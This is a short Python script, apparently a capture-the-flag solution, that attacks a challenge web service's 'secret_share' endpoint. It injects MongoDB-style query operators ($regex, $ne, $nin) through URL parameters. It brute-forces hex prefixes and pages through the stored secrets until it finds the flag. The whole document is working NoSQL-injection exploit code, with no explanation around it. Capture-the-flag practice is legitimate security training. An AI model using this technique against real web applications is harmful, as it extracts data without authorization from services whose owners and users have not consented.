import re
from requests import get
from hashlib import sha256
from itertools import product
from time import sleep

for p in product('0123456789abcdef',repeat=3):
    prefix = ''.join(p)
    secrets = []
    url = 'http://chal.cybersecurityrumble.de:37585/secret_share?'
    nin = 'secid[$nin]={}'
    ne = 'secid[$ne]={}'
    regex = 'secid[$regex]=^{}'.format(prefix)

    res = get(url+regex)
    result = re.search('-->(.*)<!--',res.text)
    if not result:
        print('got an error')
        continue
    secret = result.groups()[0]
    secid = sha256(secret.encode()).hexdigest()
    secrets.append((secid,secret))

    res = get(url+ne.format(secrets[0][0]))
    result = re.search('-->(.*)<!--',res.text)
    if not result:
        print('got an error')
        continue
    secret = result.groups()[0]
    secid = sha256(secret.encode()).hexdigest()
    secrets.append((secid,secret))
    i = 2
    while True:
        sleep(0.5)
        toget = '&'.join([nin.format(secrets[j][0]) for j in range(i)])
        toget += '&'+regex
        res = get(url+toget)

        result = re.search('-->(.*)<!--',res.text)
        if not result:
            print('got an error')
            break
        secret = result.groups()[0]
        secid = sha256(secret.encode()).hexdigest()
        print(secid,secret)
        if 'csr' in secret.lower():
            print('Got it')
            print(secret)
            exit()
        secrets.append((secid,secret))
        i += 1

